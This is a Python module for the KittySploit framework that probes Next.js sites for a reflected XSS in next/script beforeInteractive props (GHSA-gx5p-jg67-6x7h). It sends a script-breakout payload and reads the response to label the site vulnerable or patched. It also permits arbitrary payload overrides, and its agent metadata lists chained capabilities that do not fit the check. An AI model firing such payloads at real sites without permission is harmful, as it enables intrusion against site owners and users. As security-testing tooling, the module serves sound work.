#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_DEFAULT_FRAGMENT = '</script><script>window.__pwn=true;alert("VALIDATION_TOKEN")</script><x x="'
_PUSH = "(self.__next_s=self.__next_s||[]).push("
_NEEDLE = "</script><script>"
_ESCAPED = "\\u003c/script\\u003e\\u003cscript\\u003e"


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js next/script beforeInteractive XSS (GHSA-gx5p-jg67-6x7h)",
        "description": (
            "GET the page with a reflected query param containing a `</script><script>` breakout; "
            "checks whether it appears verbatim after `(self.__next_s=...).push(` (unsafe JSON-in-script) "
            "vs `\\\\u003c` escapes (patched). Requires a page that forwards the param into "
            "`<Script strategy=\"beforeInteractive\" {...} />` props."
        ),
        "author": ["KittySploit Team"],
        "references": ["https://github.com/advisories/GHSA-gx5p-jg67-6x7h"],
        "tags": ["http", "nextjs", "xss", "script", "ghsa"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints', 'params'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    inject_param = OptString("tid", "Query parameter name carrying the URL-encoded payload", required=False)
    xss_payload_override = OptString(
        "",
        "Raw payload before encoding (empty = built-in PoC fragment)",
        required=False,
        advanced=True,
    )

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _url(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        path = str(self.path).strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        return f"{proto}://{t}:{p}{path}"

    def _probe_url(self) -> str:
        frag = str(self._o(self.xss_payload_override) or "").strip() or _DEFAULT_FRAGMENT
        enc = quote(frag, safe="")
        base = self._url()
        sep = "&" if "?" in base else "?"
        name = str(self._o(self.inject_param) or "tid").strip() or "tid"
        return f"{base}{sep}{name}={enc}"

    def _get_html(self):
        url = self._probe_url()
        try:
            r = self.get(url, timeout=float(self._o(self.timeout)))
            return r.status_code, r.text, None, url
        except Exception as e:
            return -1, "", str(e), url

    @staticmethod
    def _classify(body: str) -> str:
        if not body:
            return "empty"
        push_idx = body.find(_PUSH)
        tail = body[push_idx:] if push_idx != -1 else body
        if _NEEDLE in tail:
            return "vulnerable"
        if _ESCAPED in body:
            return "patched"
        return "inconclusive"

    def check(self):
        code, body, err, url = self._get_html()
        if err:
            return {"vulnerable": False, "reason": f"GET failed: {err}", "confidence": "high", "url": url}
        if code != 200:
            return {"vulnerable": False, "reason": f"HTTP {code}", "confidence": "medium", "url": url}
        v = self._classify(body)
        if v == "vulnerable":
            return {
                "vulnerable": True,
                "reason": "Raw </script><script> after __next_s.push (unsafe emit)",
                "confidence": "high",
                "url": url,
            }
        if v == "patched":
            return {
                "vulnerable": False,
                "reason": "Unicode-escaped angle brackets (htmlEscapeJsonString)",
                "confidence": "high",
                "url": url,
            }
        return {
            "vulnerable": False,
            "reason": "Neither verbatim breakout nor u003c escape pattern",
            "confidence": "low",
            "url": url,
        }

    def run(self) -> bool:
        url = self._probe_url()
        print_info(f"GET: {url}")
        code, body, err, _ = self._get_html()
        if err:
            print_error(f"Request failed: {err}")
            return False
        print_status(f"HTTP {code}  body length {len(body)}")
        lines = body.splitlines()[:40]
        print_status("--- body (first 40 lines) ---\n" + "\n".join(lines) + "\n---")

        v = self._classify(body)
        if v == "vulnerable":
            print_error("Vulnerable — raw </script><script> reached inline next/script context.")
            return True
        if v == "patched":
            print_success("Patched — \\u003c-style escapes present.")
            return False
        print_warning("Inconclusive — page may not reflect the param into beforeInteractive props.")
        return False
